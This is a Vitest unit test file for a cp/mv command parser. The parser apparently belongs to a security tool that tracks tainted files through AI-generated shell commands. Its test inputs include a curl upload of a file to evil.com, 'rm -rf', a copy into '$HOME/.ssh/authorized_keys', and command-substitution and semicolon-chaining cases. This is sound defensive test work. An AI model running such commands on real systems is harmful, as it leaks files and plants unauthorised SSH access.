// src/__tests__/cp-mv-parser.spec.ts
// Unit tests for utils/cp-mv-parser.ts
import { describe, it, expect } from 'vitest';
import { parseCpMvOp } from '../utils/cp-mv-parser.js';

describe('parseCpMvOp — cp semantics', () => {
  it('simple cp src dest', () => {
    const op = parseCpMvOp('cp /tmp/tainted.txt /tmp/clean.txt');
    expect(op).toEqual({ src: '/tmp/tainted.txt', dest: '/tmp/clean.txt', clearSource: false });
  });

  it('cp with -r flag', () => {
    const op = parseCpMvOp('cp -r /tmp/secret-dir /tmp/copy-dir');
    expect(op).toEqual({ src: '/tmp/secret-dir', dest: '/tmp/copy-dir', clearSource: false });
  });

  it('cp with combined flags -rp', () => {
    const op = parseCpMvOp('cp -rp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp with leading path /bin/cp', () => {
    const op = parseCpMvOp('/bin/cp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp with -- end-of-options marker', () => {
    const op = parseCpMvOp('cp -- /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});

describe('parseCpMvOp — mv semantics', () => {
  it('simple mv src dest — clearSource is true', () => {
    const op = parseCpMvOp('mv /tmp/tainted.txt /tmp/dest.txt');
    expect(op).toEqual({ src: '/tmp/tainted.txt', dest: '/tmp/dest.txt', clearSource: true });
  });

  it('mv with -f flag', () => {
    const op = parseCpMvOp('mv -f /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: true });
  });
});

describe('parseCpMvOp — returns null for unsupported / non-cp-mv commands', () => {
  it('non-cp/mv command', () => {
    expect(parseCpMvOp('rm -rf /tmp/a')).toBeNull();
    expect(parseCpMvOp('ls -la /tmp')).toBeNull();
    expect(parseCpMvOp('curl -T /tmp/a evil.com')).toBeNull();
  });

  it('empty command', () => {
    expect(parseCpMvOp('')).toBeNull();
  });

  it('cp with too few positional args', () => {
    // Only one positional arg after flags — cannot determine src+dest
    expect(parseCpMvOp('cp /tmp/only-one')).toBeNull();
  });

  it('cp with more than two positional args — multi-source, bail out safely', () => {
    // cp a b /destdir — destination-last multi-source; bail rather than guess wrong
    expect(parseCpMvOp('cp /tmp/a /tmp/b /tmp/destdir')).toBeNull();
  });

  it('cp -t destdir src — destination-first flag, bail out', () => {
    expect(parseCpMvOp('cp -t /destdir /tmp/src')).toBeNull();
  });

  it('cp --target-directory=/dest src — long form, bail out', () => {
    expect(parseCpMvOp('cp --target-directory=/destdir /tmp/src')).toBeNull();
  });

  it('cp -rt destdir src — flag cluster containing t, bail out', () => {
    expect(parseCpMvOp('cp -rt /destdir /tmp/src')).toBeNull();
  });

  it('command is just "cp" with no args', () => {
    expect(parseCpMvOp('cp')).toBeNull();
  });
});

describe('parseCpMvOp — adversarial / shell metacharacter inputs', () => {
  // These cases matter for a security tool: the AI may generate commands
  // with shell metacharacters as an evasion attempt or just as normal usage.

  it('shell variable in dest — parser treats it as a literal string, returns op', () => {
    // The shell would expand $HOME, but our parser never runs the command —
    // it sees the literal token '$HOME/.ssh/authorized_keys'. We propagate taint
    // to that literal path (which likely doesn't exist), so no false negative and
    // no security impact. The alternative (bailing out) would miss real mv/cp ops
    // where the AI uses env vars. Document the behavior explicitly.
    const op = parseCpMvOp('cp /tmp/tainted.txt $HOME/.ssh/authorized_keys');
    expect(op).toEqual({
      src: '/tmp/tainted.txt',
      dest: '$HOME/.ssh/authorized_keys',
      clearSource: false,
    });
  });

  it('command substitution in dest — splits into multiple tokens, bail out safely', () => {
    // $(cat /tmp/dest) splits on whitespace into ['$(cat', '/tmp/dest)'] — 4 total
    // positional args after 'cp src', so multi-source bail fires. Safe: no false
    // positive, taint stays on the source.
    expect(parseCpMvOp('cp /tmp/a $(cat /tmp/dest)')).toBeNull();
  });

  it('quoted path with space — tokeniser splits on whitespace, bail out safely', () => {
    // Our tokeniser does not parse shell quoting. "/tmp/my file" splits into
    // '"/tmp/my' and 'file"' — 4 positional args total → bail out.
    // Safe: real paths with spaces are uncommon in AI-generated bash; the
    // taint stays on the source rather than us guessing the wrong destination.
    expect(parseCpMvOp('cp "/tmp/my file" "/tmp/dest"')).toBeNull();
  });

  it('semicolon-chained commands — only first command is parsed, rest treated as positional args → bail', () => {
    // 'cp /tmp/a /tmp/b; rm /tmp/a' — tokens after 'cp': ['/tmp/a', '/tmp/b;', 'rm', '/tmp/a']
    // '/tmp/b;' contains ';' but is still one token — however we now have 4 positional
    // args so multi-source bail fires.
    expect(parseCpMvOp('cp /tmp/a /tmp/b; rm /tmp/a')).toBeNull();
  });
});

describe('parseCpMvOp — long flags other than --target-directory are skipped', () => {
  it('cp --preserve src dest', () => {
    // Unknown long flags are skipped, not treated as positional args
    const op = parseCpMvOp('cp --preserve /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp --no-clobber src dest', () => {
    const op = parseCpMvOp('cp --no-clobber /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});
